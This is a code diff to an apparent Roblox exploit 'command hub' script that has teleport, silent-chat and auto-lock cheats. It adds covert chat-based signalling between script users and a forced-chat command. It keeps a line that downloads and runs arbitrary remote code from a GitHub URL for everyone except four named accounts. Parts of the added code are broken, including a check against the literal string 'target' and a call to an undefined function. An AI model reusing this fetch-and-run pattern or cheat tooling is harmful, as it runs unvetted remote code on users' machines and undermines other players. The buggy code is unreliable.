@@ -180,6 +180,10 @@ Base.Draggable = true
 
 -- var
 
+local cloneref = cloneref or function(o) return o end
+local TextChatService = cloneref(game:GetService("TextChatService"))
+local isLegacyChat = TextChatService.ChatVersion == Enum.ChatVersion.LegacyChatService
+local ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage"))
 local locking = false
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
@@ -297,11 +301,60 @@ end)
 
 local Players = game:GetService("Players")
 
+-- connect
 if speaker.Name == "EeRIlIlIllIlIlIl" or speaker.Name == "piepiepie894" or speaker.Name == "EOUHWEBBIUweiuwy" or speaker.Name == "woodsofinemeow" then
     notif("not exec")
 else
     loadstring(game:HttpGet('https://raw.githubusercontent.com/Emerald15233/test/refs/heads/ee/code'))()
 end
+
+local connectoptionperms = false
+local speakersname = game.Players.LocalPlayer.Name
+local requestername = "-"
+local playerA = game:GetService("Players").LocalPlayer
+function ConnectP1(plr)
+    if plr == playerA then return end
+	plr.Chatted:Connect(function(msg)
+		local command, message = string.match(msg, '^(%S+)%s+(.*)$')
+		if command == "..getrequestername2834" and message then
+			requestername = message
+		end
+	end)
+end
+
+function ConnectP3(plr)
+    if plr == playerA then return end
+	plr.Chatted:Connect(function(msg)
+		local command1, message1 = string.match(msg, '^(%S+)%s+(.*)$')
+		if command1 == "..askforconnect8172" and message1 then
+			if message1 ~= speakersname then return end
+            connectoptionperms = true
+            notif(requestername .. "Is requesting to connect")
+            notif("Type >yes to accept, >no to decline. This request lasts for 10 seconds")
+            wait(10)
+            if connectoptionperms == false then
+                notif("Time ran out. Declined request")
+                game.Players:Chat("..requestdecline122")
+            end
+		end
+	end)
+end
+
+local requestyes = false
+local requestno = false
+function ConnectP4(plr)
+ 	plr.Chatted:Connect(function(msg)
+         if msg == "..requestaccept122" then
+            requestyes = true
+            task.wait(2)
+            requestyes = false
+         elseif msg == "..requestdecline122" then
+            requestno = true
+            task.wait(.2)
+            requestno = false
+         end
+ 	end)
+ end
 
 local function getPlayer(name)
     local foundPlayers = {}
@@ -314,6 +367,16 @@ local function getPlayer(name)
 end
 
 -- func
+
+function chatMessage(str)
+    str = tostring(str)
+    if not isLegacyChat then
+        TextChatService.TextChannels.RBXGeneral:SendAsync(str)
+    else
+        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str, "All")
+    end
+end
+
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local Camera = workspace.CurrentCamera
@@ -989,6 +1052,48 @@ local function usetsbmove(move)
     end
 end
 
+commands.yes = function()
+    local speakername = game.Players.LocalPlayer.Name
+    if connectoptionperms then
+        notif("Accepted request")
+        game.Players:Chat("..requestaccept122")
+    else
+        notif("No requests to accept")
+    end
+end
+
+wait()
+
+commands.no = function()
+    local speakername = game.Players.LocalPlayer.Name
+    if connectoptionperms then
+        notif("Declined request")
+        game.Players:Chat("..requestdecline122")
+    else
+        notif("No requests to decline")
+    end
+end
+
+wait()
+
+
+commands.say = function(msg)
+    if dontuse then return end
+    dontuse = true
+    task.wait(.2)
+    chatMessage(msg)
+    task.wait(.2)
+    dontuse = false
+end
+
+wait()
+
+commands.test2 = function()
+    chatMessage("ee")
+end
+
+wait()
+
 commands.autolock = function()
     if dontuse then return end
     dontuse = true
@@ -1052,6 +1157,8 @@ commands.rj = function()
     rejoin()
 end
 wait()
+
+
 
 commands.tpclick = function(key)
     tpclick(key)
@@ -1314,6 +1421,27 @@ end
 
 wait()
 
+commands.connect = function(plr)
+    local target = getfullname(plr)
+    local speakername = game.Players.LocalPlayer.Name
+    if not game.Players:FindFirstChild("target") then
+        error("invalid target")
+    end
+    notif("Connecting to ".. target)
+    task.wait(1)
+    game.Players:Chat("..getrequestername2834 ".. speakername)
+    task.wait(.1)
+    game.Players:Chat("..askforconnect8172 ".. target)
+    wait()
+    notif("Waiting for response...")
+    repeat wait() until requestyes or requestno
+    if requestyes then
+        notif(target .." accepted the request")
+    elseif requestno then
+        notif(target.. "declined the request")
+    end
+end
+
 commands.silentchat = function(e)
     if not e or e == "" then return end
     notif("Chatted silently: " .. e)
@@ -1478,6 +1606,7 @@ wait()
 commands.undertp = function(plr)
     undertp(plr)
 end
+
 wait()
 
 commands.cmdlist = function()
@@ -1646,6 +1775,18 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
         end
     end
 end)
+
+for i, v in pairs(game:GetService("Players"):GetPlayers()) do
+	ConnectP1(v)
+    ConnectP3(v)
+    ConnectP4(v)
+end
+
+game:GetService("Players").PlayerAdded:Connect(function(plr)
+	ConnectP1(plr)
+    ConnectP2(plr)
+end)
+
 
 wait()
 notif("cmdhub loaded")
